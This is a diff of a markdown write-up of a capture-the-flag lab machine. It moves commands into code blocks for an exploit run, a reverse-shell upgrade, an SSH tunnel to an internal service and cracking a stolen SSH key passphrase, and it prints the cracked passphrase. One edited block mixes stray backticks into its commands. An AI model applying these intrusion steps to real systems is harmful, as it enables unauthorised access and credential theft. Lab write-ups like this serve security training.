@@ -96,7 +96,9 @@ it takes a `url` as the argument and reads a command from the user to include it
 
 *since it doesn't look malicious,* we run it and give it the url of the application `http://10.10.10.171/ona/` as an argument
 
-`./exploit.sh http://10.10.10.171/ona/`
+```bash
+exploit.sh http://10.10.10.171/ona/
+```
 
 and we get command execution!
 
@@ -125,7 +127,9 @@ the reverse shell connects back when we visit `http://10.10.10.171/ona/revvy.php
 
 we then upgrade our shell to full tty as normal
 
-`python3 -c 'import pty; pty.spawn("/bin/bash")'` > `CTRL + Z` > `stty raw -echo` > `fg` > `export SHELL=/bin/bash && export TERM=xterm-256color`
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'` > `CTRL + Z` > `stty raw -echo` > `fg` > `export SHELL=/bin/bash && export TERM=xterm-256color
+```
 
 
 ### Searching for custom content
@@ -149,7 +153,7 @@ taking a look in every one of them is not feasable by any means. so we look for 
 
 *after some considerable time,* we find the file `database_settings.inc.php` inside `/var/www/ona/local/config`. It contained the username and password for the database user:
 
-```
+```php
 <?php
 
 $ona_contexts=array (
@@ -341,8 +345,7 @@ it contained those php files.
 *while browsing through the contents,* we find out that if the user managed to log in with the correct password on `index.php`, he would get redirected to `main.php` which pulls out the contents of `/home/joanna/.ssh/id_rsa` which is the ssh key for the `joanna` user.
 
 `index.php` contents:
-```
-...SNIP...
+```php
 <h2>Enter Username and Password</h2>
 <div class = "container form-signin">
 <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
@@ -359,11 +362,10 @@ it contained those php files.
     }
  ?>
 </div> <!-- /container -->
-...SNIP...
 ```
 
 main.php contents:
-```
+```php
 <?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
 # Open Admin Trusted
 # OpenAdmin
@@ -407,7 +409,9 @@ we know that we should get the contents of `joanna`'s ssh key if we log in with 
 
 so we create an `SSH tunnel` to bring out that internal `52846` port to our `localhost` on port `8888`
 
-`ssh jimmy@10.10.10.171 -L 8888:127.0.0.1:52846`
+```bash
+ssh jimmy@10.10.10.171 -L 8888:127.0.0.1:52846
+```
 
 and we see the login form:
 
@@ -427,9 +431,9 @@ and we use it to log in. but it requires a passphrase :D
 
 we use the tool `ssh2john` to change the ssh key into a format that's crackable by `john`. we crack the password using the `rockyou.txt` wordlist.
 
-```
-$ ssh2john joanna_key > joanna_john
-$ john joanna_john --wordlist=/usr/share/wordlists/rockyou.txt
+```bash
+ssh2john joanna_key > joanna_john
+john joanna_john --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 the password turns out to be `bloodninjas`
